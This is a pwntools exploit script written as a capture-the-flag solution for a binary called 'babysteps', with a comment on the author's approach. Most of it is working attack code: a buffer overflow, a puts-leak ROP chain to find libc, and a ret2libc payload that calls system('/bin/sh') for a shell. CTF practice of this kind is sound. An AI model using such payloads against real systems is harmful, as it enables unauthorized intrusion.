#!/usr/bin/python3
# @author: CryptoCat (https://github.com/Crypto-Cat/CTF/tree/main/pwn)
# Modified by An00bRektn
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'First, what is your baby name?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
continue
'''.format(**locals())

# Binary filename
exe = './babysteps'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

"""
    So apparently this was supposed to be a buffer overflow with shellcode injection
    but I couldn't get my shellcode working for the life of me because the buffer size was so small.
    I then tried to ret2libc, but I was unable to solve this before the end of the CTF because I
    couldn't find the right libc version. Based on people's writeups later, they just used the most
    recent version, which was probably the smart thing to do. Another alternative route here was
    a ret2dlresolve, but I was unfamiliar with the technique, so I just didn't do that either. 
"""

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("/lib/i386-linux-gnu/libc.so.6") # LOCAL

# http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-i386_2.35-0ubuntu3_amd64.deb
libc = ELF("./libc.so.6") # REMOTE

# Pass in pattern_size, get back EIP/RIP offset
offset = 28 # find_ip(cyclic(100))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        elf.plt.puts,
        elf.symbols.ask_baby_name,  # Return to ask_baby_name (to overflow buffer with another payload)
        elf.got.puts  # Call puts() to leak the got.puts address
    ]
})

# Send the payload
io.sendlineafter(b'First, what is your baby name?', payload)
io.recv(4)

# Retrieve got.puts address
got_puts = unpack(io.recv()[:4].strip().ljust(4, b'\x00'))

info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Payload to get shell: system('/bin/sh')
payload = flat({
    (offset): [
        libc.symbols.system,
        0x0,
        next(libc.search(b'/bin/sh\x00')),
    ]
})
#io.sendline(payload)
io.sendlineafter(b'First, what is your baby name?', payload)

# Got Shell?
io.interactive()
